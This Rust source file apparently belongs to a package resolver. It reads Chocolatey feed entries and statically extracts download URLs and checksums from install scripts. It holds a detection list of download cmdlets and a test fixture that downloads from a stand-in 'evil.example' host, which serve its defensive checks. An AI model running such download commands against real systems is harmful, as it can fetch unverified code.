//! Chocolatey: version from the community OData (Atom) feed, artifact is the
//! `.nupkg`. Its install script usually downloads the real installer; the CLI
//! extracts `tools/chocolateyInstall.ps1` after download and calls
//! [`chocolatey_script_sources`] to resolve literal download URLs statically.

use bytebouncer_core::{PackageRequest, ResolvedPackage, SourceRef};

use crate::util::{self, compare_versions, excerpt, percent_encode};
use crate::{Fetcher, Resolution, ResolveError, fetch_opt};

const FEED: &str = "https://community.chocolatey.org/api/v2";
const MAX_FEED: u64 = 16 * 1024 * 1024;
const MAX_PAGES: usize = 10;

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct FeedEntry {
    pub id: String,
    pub version: String,
    pub prerelease: bool,
    pub hash: Option<String>,
    pub hash_algorithm: Option<String>,
    pub dependencies: Vec<String>,
    pub content_src: Option<String>,
    pub status: Option<String>,
}

/// Parse one page of the feed; returns entries and the `next` link.
pub fn parse_feed(xml: &str) -> Result<(Vec<FeedEntry>, Option<String>), String> {
    let opts = roxmltree::ParsingOptions {
        allow_dtd: false,
        ..Default::default()
    };
    let doc =
        roxmltree::Document::parse_with_options(xml, opts).map_err(|e| format!("XML: {e}"))?;
    let root = doc.root_element();
    let mut entries = Vec::new();
    let mut next = None;
    for child in root.children().filter(|n| n.is_element()) {
        match child.tag_name().name() {
            "link" if child.attribute("rel") == Some("next") => {
                next = child.attribute("href").map(str::to_string);
            }
            "entry" => {
                let mut e = FeedEntry::default();
                for n in child.descendants().filter(|n| n.is_element()) {
                    let text = n.text().unwrap_or("").trim().to_string();
                    match n.tag_name().name() {
                        "title" if e.id.is_empty() => e.id = text,
                        "content" => e.content_src = n.attribute("src").map(str::to_string),
                        "Version" => e.version = text,
                        "IsPrerelease" => e.prerelease = text == "true",
                        "PackageHash" => e.hash = Some(text),
                        "PackageHashAlgorithm" => e.hash_algorithm = Some(text),
                        "PackageStatus" => e.status = Some(text),
                        "Dependencies" => {
                            e.dependencies = text
                                .split('|')
                                .filter(|d| !d.is_empty())
                                .map(|d| {
                                    let mut p = d.split(':');
                                    let id = p.next().unwrap_or("");
                                    match p.next().filter(|v| !v.is_empty()) {
                                        Some(v) => format!("{id} {v}"),
                                        None => id.to_string(),
                                    }
                                })
                                .collect();
                        }
                        _ => {}
                    }
                }
                if !e.version.is_empty() {
                    entries.push(e);
                }
            }
            _ => {}
        }
    }
    Ok((entries, next))
}

pub fn resolve(
    req: &PackageRequest,
    fetcher: &dyn Fetcher,
    res: &mut Resolution,
) -> Result<(), ResolveError> {
    let want_version = req
        .options
        .iter()
        .find_map(|o| o.strip_prefix("--version="));
    let allow_pre = req.options.iter().any(|o| o == "--prerelease");
    for id in &req.packages {
        let mut url = format!("{FEED}/FindPackagesById()?id=%27{}%27", percent_encode(id));
        let mut entries = Vec::new();
        for page in 0..MAX_PAGES {
            let Some(f) = fetch_opt(fetcher, &url, &[], MAX_FEED)? else {
                break;
            };
            let (mut e, next) =
                parse_feed(&String::from_utf8_lossy(&f.bytes)).map_err(|message| {
                    ResolveError::Malformed {
                        url: url.clone(),
                        message,
                    }
                })?;
            entries.append(&mut e);
            match next {
                Some(n) if n.starts_with(&format!("{FEED}/")) && page + 1 < MAX_PAGES => url = n,
                Some(_) if page + 1 == MAX_PAGES => {
                    res.notes.push(format!(
                        "chocolatey: {id}: version list truncated after {MAX_PAGES} pages"
                    ));
                    break;
                }
                _ => break,
            }
        }
        let entries: Vec<&FeedEntry> = entries
            .iter()
            .filter(|e| e.id.eq_ignore_ascii_case(id))
            .collect();
        if entries.is_empty() {
            res.unresolved.push(format!(
                "chocolatey: package `{id}` not found in the community repository"
            ));
            continue;
        }
        let chosen = match want_version {
            Some(v) => entries.iter().find(|e| e.version == v).or_else(|| {
                entries
                    .iter()
                    .find(|e| compare_versions(&e.version, v).is_eq())
            }),
            None => entries
                .iter()
                .filter(|e| allow_pre || !e.prerelease)
                .max_by(|a, b| compare_versions(&a.version, &b.version)),
        };
        let Some(e) = chosen.copied() else {
            res.unresolved.push(format!(
                "chocolatey: {id}: no {} version{}",
                if allow_pre { "" } else { "stable" },
                want_version.map(|v| format!(" {v}")).unwrap_or_default()
            ));
            continue;
        };
        let expected = format!("{FEED}/package/");
        let url = e
            .content_src
            .clone()
            .filter(|s| s.starts_with(&expected))
            .unwrap_or_else(|| {
                format!(
                    "{FEED}/package/{}/{}",
                    percent_encode(&e.id),
                    percent_encode(&e.version)
                )
            });
        let mut s = util::source_ref(
            &url,
            Some(&format!(
                "{}.{}.nupkg",
                e.id.to_ascii_lowercase(),
                e.version
            )),
        );
        match (
            e.hash_algorithm.as_deref(),
            e.hash.as_deref().and_then(util::b64_decode),
        ) {
            (Some(a), Some(h)) if a.eq_ignore_ascii_case("SHA512") && h.len() == 64 => {
                s.expected_sha512 = Some(hex::encode(h));
            }
            (Some(a), Some(h)) if a.eq_ignore_ascii_case("SHA256") && h.len() == 32 => {
                s.expected_sha256 = Some(hex::encode(h));
            }
            _ => res.notes.push(format!(
                "chocolatey: {id} {}: feed has no usable package hash",
                e.version
            )),
        }
        if let Some(st) = &e.status {
            res.notes.push(format!(
                "chocolatey: {id} {} moderation status: {st}",
                e.version
            ));
        }
        if !e.dependencies.is_empty() {
            res.notes.push(format!(
                "chocolatey: {id} depends on {} — if this is a meta-package, the real installer is in a dependency, which is not resolved by default",
                e.dependencies.join(", ")
            ));
        }
        res.notes.push(format!(
            "chocolatey: {id}: the .nupkg's tools/chocolateyInstall.ps1 usually downloads the real installer; inspect it after download (chocolatey_script_sources)"
        ));
        res.packages.push(ResolvedPackage {
            name: e.id.clone(),
            version: e.version.clone(),
            arch: None,
            repository: Some("chocolatey-community".to_string()),
            sources: vec![s],
            recipe_files: Vec::new(),
            dependencies: e.dependencies.clone(),
        });
    }
    Ok(())
}

// ------------------------------------------------- install script reading ---

const KEYS: &[&str] = &[
    "url",
    "url64bit",
    "url64",
    "checksum",
    "checksum64",
    "checksumtype",
    "checksumtype64",
];

const DOWNLOAD_CMDLETS: &[&str] = &[
    "invoke-webrequest",
    "invoke-restmethod",
    "downloadfile(",
    "downloadstring(",
    "start-bitstransfer",
    "iwr ",
    "irm ",
    "wget ",
    "curl ",
    "net.webclient",
];

/// A literal-or-unresolved PowerShell value.
type Val = Result<String, String>;

struct Script {
    vars: std::collections::HashMap<String, Val>,
}

impl Script {
    /// Evaluate a PowerShell value expression if it is a plain literal or a
    /// reference to a literal variable.
    fn value(&self, expr: &str) -> Val {
        let e = expr.trim().trim_end_matches(';').trim();
        let e = strip_comment(e).trim();
        if let Some(inner) = e.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')) {
            if inner.contains('\'') && !inner.contains("''") {
                return Err(format!("`{}` is not a single literal", excerpt(e, 80)));
            }
            return Ok(inner.replace("''", "'"));
        }
        if let Some(inner) = e.strip_prefix('"').and_then(|s| s.strip_suffix('"')) {
            return self.expand_double(inner);
        }
        if let Some(name) = e.strip_prefix('$')
            && !name.is_empty()
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        {
            return self.lookup(name);
        }
        Err(format!("`{}` is computed at run time", excerpt(e, 80)))
    }

    fn lookup(&self, name: &str) -> Val {
        match self.vars.get(&name.to_ascii_lowercase()) {
            Some(v) => v.clone(),
            None => Err(format!(
                "`${name}` is not a literal assignment in this script"
            )),
        }
    }

    fn expand_double(&self, s: &str) -> Val {
        if s.contains('`') || s.contains("$(") || s.contains('"') {
            return Err(format!("`\"{}\"` uses run-time expansion", excerpt(s, 80)));
        }
        let mut out = String::new();
        let mut chars = s.chars().peekable();
        while let Some(c) = chars.next() {
            if c != '$' {
                out.push(c);
                continue;
            }
            let braced = chars.peek() == Some(&'{');
            if braced {
                chars.next();
            }
            let mut name = String::new();
            while let Some(&n) = chars.peek() {
                if n.is_ascii_alphanumeric() || n == '_' || (braced && n != '}') {
                    name.push(n);
                    chars.next();
                } else {
                    break;
                }
            }
            if braced && chars.next() != Some('}') {
                return Err("unterminated `${`".to_string());
            }
            if name.is_empty() || name.contains(':') {
                return Err(format!("`${name}` is environment/scope dependent"));
            }
            out.push_str(&self.lookup(&name)?);
        }
        Ok(out)
    }
}

fn strip_comment(s: &str) -> &str {
    // Remove a trailing `# …` that is outside quotes.
    let mut in_s = false;
    let mut in_d = false;
    for (i, c) in s.char_indices() {
        match c {
            '\'' if !in_d => in_s = !in_s,
            '"' if !in_s => in_d = !in_d,
            '#' if !in_s && !in_d => return &s[..i],
            _ => {}
        }
    }
    s
}

/// Split a command line into PowerShell-ish tokens (quotes kept).
fn ps_tokens(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    for c in s.chars() {
        match quote {
            Some(q) => {
                cur.push(c);
                if c == q {
                    quote = None;
                }
            }
            None if c == '\'' || c == '"' => {
                quote = Some(c);
                cur.push(c);
            }
            None if c.is_whitespace() => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            None => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// Positions (0-based, after the cmdlet name) of url / url64 parameters.
fn positional_urls(cmdlet: &str) -> Option<(usize, usize)> {
    match cmdlet {
        "install-chocolateypackage" => Some((3, 4)),
        "install-chocolateyzippackage" => Some((1, 3)),
        "get-chocolateywebfile" => Some((2, 3)),
        "install-chocolateyvsixpackage" => Some((1, 99)),
        _ => None,
    }
}

/// Extract literal download URLs and checksums from a Chocolatey install
/// script. Recognizes `$packageArgs = @{ url = '…'; checksum = '…' }`-style
/// hashtables, `-Url/-Url64bit/-Checksum…` named parameters, positional
/// arguments of the common helpers, and literal `$var = '…'` indirection.
/// Anything computed at run time is reported as unresolved, as is any other
/// download mechanism (Invoke-WebRequest, WebClient, …).
pub fn chocolatey_script_sources(ps1: &str) -> (Vec<SourceRef>, Vec<String>) {
    let mut script = Script {
        vars: Default::default(),
    };
    let mut unresolved = Vec::new();
    // group id -> ordered (key, value)
    let mut groups: Vec<Vec<(String, Val)>> = Vec::new();
    let mut in_hash = false;
    let mut depth = 0i32;
    let mut in_block_comment = false;

    for raw in ps1.lines() {
        let line = raw.trim().trim_start_matches('\u{feff}');
        if in_block_comment {
            if line.contains("#>") {
                in_block_comment = false;
            }
            continue;
        }
        if line.starts_with("<#") {
            in_block_comment = !line.contains("#>");
            continue;
        }
        if line.starts_with('#') || line.is_empty() {
            continue;
        }
        let code = strip_comment(line).trim();
        let lower = code.to_ascii_lowercase();
        for d in DOWNLOAD_CMDLETS {
            if lower.contains(d) {
                unresolved.push(format!(
                    "script downloads with `{}` outside Chocolatey helpers: {}",
                    d.trim_end_matches(['(', ' ']),
                    excerpt(code, 160)
                ));
            }
        }

        // `$name = <literal>` (not a hashtable) records a variable.
        if let Some(rest) = code.strip_prefix('$')
            && let Some((name, value)) = rest.split_once('=')
            && !value.trim_start().starts_with("@{")
            && !name.trim().is_empty()
            && name
                .trim()
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '_')
        {
            let v = script.value(value);
            script.vars.insert(name.trim().to_ascii_lowercase(), v);
        }

        // `$packageArgs.url = …` / `$packageArgs['url'] = …` overrides.
        if let Some(rest) = code.strip_prefix('$')
            && let Some((lhs, value)) = rest.split_once('=')
        {
            let key = lhs
                .split_once('.')
                .map(|(_, k)| k)
                .or_else(|| lhs.split_once('[').map(|(_, k)| k.trim_end_matches(']')))
                .map(|k| {
                    k.trim()
                        .trim_matches(['\'', '"', ' ', ']'])
                        .to_ascii_lowercase()
                });
            if let Some(k) = key
                && KEYS.contains(&k.as_str())
            {
                let v = script.value(value);
                match groups.last_mut() {
                    Some(g) => g.push((k, v)),
                    None => groups.push(vec![(k, v)]),
                }
            }
        }

        if code.contains("@{") {
            in_hash = true;
            depth = 0;
            groups.push(Vec::new());
        }
        if in_hash {
            depth += code.matches('{').count() as i32 - code.matches('}').count() as i32;
            // `key = value` entries (possibly several separated by `;`).
            let body = code.split_once("@{").map(|(_, b)| b).unwrap_or(code);
            for part in body.split(';') {
                if let Some((k, v)) = part.split_once('=') {
                    let k = k.trim().trim_matches(['\'', '"']).to_ascii_lowercase();
                    if KEYS.contains(&k.as_str()) {
                        let v = v.trim().trim_end_matches('}').trim();
                        let val = script.value(v);
                        if let Some(g) = groups.last_mut() {
                            g.push((k, val));
                        }
                    }
                }
            }
            if depth <= 0 {
                in_hash = false;
            }
            continue;
        }

        // Cmdlet invocations with named or positional parameters.
        let tokens = ps_tokens(code);
        let Some(first) = tokens.first() else {
            continue;
        };
        let cmdlet = first.to_ascii_lowercase();
        if !cmdlet.contains("chocolatey") {
            continue;
        }
        let mut group = Vec::new();
        let mut positional = Vec::new();
        let mut i = 1;
        while i < tokens.len() {
            let t = &tokens[i];
            if let Some(p) = t.strip_prefix('-') {
                let p = p.trim_end_matches(':').to_ascii_lowercase();
                if KEYS.contains(&p.as_str()) {
                    if let Some(v) = tokens.get(i + 1) {
                        group.push((p, script.value(v)));
                    }
                    i += 2;
                    continue;
                }
                i += 2; // other named parameter and its value
                continue;
            }
            if t.starts_with('@') {
                positional.clear();
                break; // splatting a hashtable: handled above
            }
            positional.push(t.clone());
            i += 1;
        }
        if let Some((u, u64)) = positional_urls(&cmdlet) {
            if let Some(v) = positional.get(u) {
                group.push(("url".to_string(), script.value(v)));
            }
            if let Some(v) = positional.get(u64) {
                group.push(("url64bit".to_string(), script.value(v)));
            }
        }
        if !group.is_empty() {
            groups.push(group);
        }
    }

    let mut sources: Vec<SourceRef> = Vec::new();
    for g in groups {
        let get = |k: &str| {
            g.iter()
                .rev()
                .find(|(key, _)| key == k)
                .map(|(_, v)| v.clone())
        };
        let pairs = [
            ("url", get("url"), get("checksum"), get("checksumtype")),
            (
                "url64bit",
                get("url64bit").or_else(|| get("url64")),
                get("checksum64"),
                get("checksumtype64").or_else(|| get("checksumtype")),
            ),
        ];
        for (label, url, checksum, ctype) in pairs {
            let Some(url) = url else { continue };
            let url = match url {
                Ok(u) => u,
                Err(e) => {
                    unresolved.push(format!("{label}: {e}"));
                    continue;
                }
            };
            if !util::is_http_url(&url) {
                unresolved.push(format!(
                    "{label}: `{}` is not an http(s) URL",
                    excerpt(&url, 120)
                ));
                continue;
            }
            if sources.iter().any(|s| s.url == url) {
                continue;
            }
            let mut s = util::source_ref(&url, None);
            match checksum {
                Some(Ok(c)) => {
                    let c = c.trim().to_ascii_lowercase();
                    let t = match &ctype {
                        Some(Ok(t)) => t.to_ascii_lowercase(),
                        Some(Err(_)) | None => match c.len() {
                            64 => "sha256".into(),
                            128 => "sha512".into(),
                            40 => "sha1".into(),
                            _ => "md5".into(),
                        },
                    };
                    match t.as_str() {
                        "sha256" => s.expected_sha256 = util::hex_digest(&c, 64),
                        "sha512" => s.expected_sha512 = util::hex_digest(&c, 128),
                        other => unresolved.push(format!(
                            "{label} {url}: only a {other} checksum is declared (not usable for verification)"
                        )),
                    }
                    if s.expected_sha256.is_none()
                        && s.expected_sha512.is_none()
                        && matches!(t.as_str(), "sha256" | "sha512")
                    {
                        unresolved.push(format!("{label} {url}: malformed {t} checksum"));
                    }
                }
                Some(Err(e)) => unresolved.push(format!("{label} checksum: {e}")),
                None => unresolved.push(format!("{label} {url}: no checksum declared")),
            }
            sources.push(s);
        }
    }
    (sources, unresolved)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hashtable_script() {
        let ps1 = r#"$toolsPath = Split-Path $MyInvocation.MyCommand.Definition
$version = '156.0'
$packageArgs = @{
  packageName            = 'googlechrome'
  fileType               = 'MSI'
  url                    = 'https://dl.google.com/chrome/standalone.msi'
  url64bit               = "https://dl.google.com/chrome/$version/standalone64.msi"
  checksum               = '7de1a4d079b0c5b167cb1bfce41ce554efb71c98d3f5150351c7ee147c10b20e'
  checksum64             = '32BA438DEA18F0FED1EC621BFB274A2669ADEC67BE2AA91D96B3CC6C64779276'
  checksumType           = 'sha256'
  checksumType64         = 'sha256'
}
Install-ChocolateyPackage @packageArgs
"#;
        let (s, u) = chocolatey_script_sources(ps1);
        assert!(u.is_empty(), "{u:?}");
        assert_eq!(s.len(), 2);
        assert_eq!(
            s[1].url,
            "https://dl.google.com/chrome/156.0/standalone64.msi"
        );
        assert_eq!(
            s[1].expected_sha256.as_deref(),
            Some("32ba438dea18f0fed1ec621bfb274a2669adec67be2aa91d96b3cc6c64779276")
        );
    }

    #[test]
    fn named_positional_and_dynamic() {
        let ps1 = r#"
<# block
comment #>
$url = 'https://example.org/a.exe' # trailing
Install-ChocolateyPackage -PackageName 'a' -FileType 'exe' -Url $url -Checksum 'deadbeefdeadbeefdeadbeefdeadbeef' -ChecksumType 'md5'
Install-ChocolateyZipPackage 'b' 'https://example.org/b.zip' "$toolsDir" 'https://example.org/b64.zip'
$packageArgs = @{ url = "https://example.org/$(Get-Date)/c.exe"; checksum = 'x' }
$wc = New-Object Net.WebClient; $wc.DownloadFile('https://evil.example/x', 'x')
"#;
        let (s, u) = chocolatey_script_sources(ps1);
        let urls: Vec<&str> = s.iter().map(|s| s.url.as_str()).collect();
        assert_eq!(
            urls,
            vec![
                "https://example.org/a.exe",
                "https://example.org/b.zip",
                "https://example.org/b64.zip"
            ]
        );
        let joined = u.join("\n");
        assert!(joined.contains("md5"), "{joined}");
        assert!(joined.contains("run-time"), "{joined}");
        assert!(joined.contains("outside Chocolatey helpers"), "{joined}");
        assert!(joined.contains("no checksum"), "{joined}");
    }
}
